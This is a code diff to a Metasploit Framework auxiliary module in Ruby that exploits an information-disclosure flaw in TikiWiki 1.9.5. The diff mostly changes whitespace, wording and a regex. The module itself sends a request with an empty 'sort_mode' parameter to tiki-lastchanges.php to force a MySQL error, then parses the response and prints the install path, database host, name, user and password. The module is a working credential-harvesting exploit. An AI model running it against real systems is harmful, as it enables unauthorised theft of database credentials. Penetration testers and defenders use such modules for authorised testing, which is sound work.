@@ -1,4 +1,8 @@
 ##
+# $Id$
+##
+
+##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
@@ -15,10 +19,11 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'TikiWiki information disclosure',
 			'Description'    => %q{
-				A vulnerability has been reported in Tikiwiki, which can be exploited by
+					A vulnerability has been reported in Tikiwiki, which can be exploited by
 				a anonymous user to dump the MySQL user & passwd just by creating a mysql
 				error with the "sort_mode" var.
-				The vulnerability has been reported in Tikiwiki version 1.9.5.
+
+				The vulnerability was reported in Tikiwiki version 1.9.5.
 			},
 			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],
 			'License'        => MSF_LICENSE,
@@ -48,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Establishing a connection to the target...")
 
 		rpath = datastore['URI'] + "/tiki-lastchanges.php?days=1&offset=0&sort_mode="
-	
+
 		res = send_request_raw({
 			'uri'     => rpath,
 			'method'  => 'GET',
@@ -65,44 +70,46 @@ class Metasploit3 < Msf::Auxiliary
 			n = 0
 			c = 0
 
-			infos = res.body.split(/\r|\n/)
+			#puts "body is #{res.body.length} bytes"
+			infos = res.body.split(/\r?\n/)
 			infos.each do |row|
+				#puts row.inspect
 				if (c < 6)
 					if (row.match(/\["file"\]=>/))
 						c+=1
 						x = n + 1
 						y = infos[x].match(/string\(\d+\) "(.*)"/m)
-						print_status("Install path : #{y[1]}") 
+						print_status("Install path : #{y[1]}")
 					end
 					if (row.match(/\["databaseType"\]=>/))
 						c+=1
 						x = n + 1
 						y = infos[x].match(/string\(\d+\) "(.*)"/m)
-						print_status("DB type      : #{y[1]}") 
+						print_status("DB type      : #{y[1]}")
 					end
 					if (row.match(/\["database"\]=>/))
 						c+=1
 						x = n + 1
 						y = infos[x].match(/string\(\d+\) "(.*)"/m)
-						print_status("DB name      : #{y[1]}") 
+						print_status("DB name      : #{y[1]}")
 					end
 					if (row.match(/\["host"\]=>/))
 						c+=1
 						x = n + 1
 						y = infos[x].match(/string\(\d+\) "(.*)"/m)
-						print_status("DB host      : #{y[1]}") 
+						print_status("DB host      : #{y[1]}")
 					end
 					if (row.match(/\["user"\]=>/))
 						c+=1
 						x = n + 1
 						y = infos[x].match(/string\(\d+\) "(.*)"/m)
-						print_status("DB user      : #{y[1]}") 
+						print_status("DB user      : #{y[1]}")
 					end
 					if (row.match(/\["password"\]=>/))
 						c+=1
 						x = n + 1
 						y = infos[x].match(/string\(\d+\) "(.*)"/m)
-						print_status("DB password  : #{y[1]}") 
+						print_status("DB password  : #{y[1]}")
 					end
 					n+=1
 				end
